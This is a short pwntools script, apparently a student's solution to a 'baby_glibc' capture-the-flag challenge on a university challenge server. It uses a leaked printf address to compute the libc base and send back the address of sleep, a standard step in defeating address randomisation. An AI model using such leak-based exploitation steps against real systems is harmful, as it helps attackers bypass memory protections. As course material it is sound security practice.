from pwn import *

context.log_level = "info"

LOCAL = False

if LOCAL:
    p = process("./baby_glibc")
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
    e = ELF(libc)
    printf_offset = e.symbols["printf"]
    sleep_offset = e.symbols["sleep"]
    print(p.recvuntil(b"note: "))
    printf_address = int.from_bytes(p.recvline().strip(), byteorder="little")
    print("printf offset", hex(printf_offset))
    print("printf address", hex(printf_address))
    print("sleep offset", hex(sleep_offset))
    base_address = printf_address - printf_offset
    print("base address", hex(base_address))
    sleep_address = base_address + sleep_offset
    print("sleep address", hex(sleep_address))
    byte_string = sleep_address.to_bytes((sleep_address.bit_length() + 7) // 8, byteorder='big')
    p.recvuntil(b">")
    p.sendline(hex(sleep_address))
    p.recvline()
    print(p.recvline())
    p.recvline()
    print(p.recvline())

else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1235)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"
    e = ELF(libc)
    printf_offset = e.symbols["printf"]
    sleep_offset = e.symbols["sleep"]
    print(p.recvuntil(b"note: "))
    printf_address = int.from_bytes(p.recvline().strip(), byteorder="little")
    print("printf offset", hex(printf_offset))
    print("printf address", hex(printf_address))
    print("sleep offset", hex(sleep_offset))
    base_address = printf_address - printf_offset
    print("base address", hex(base_address))
    sleep_address = base_address + sleep_offset
    print("sleep address", hex(sleep_address))
    byte_string = sleep_address.to_bytes((sleep_address.bit_length() + 7) // 8, byteorder='big')
    p.recvuntil(b">")
    p.sendline(hex(sleep_address))
    p.recvline()
    print(p.recvline())
    p.recvline()
    print(p.recvline())

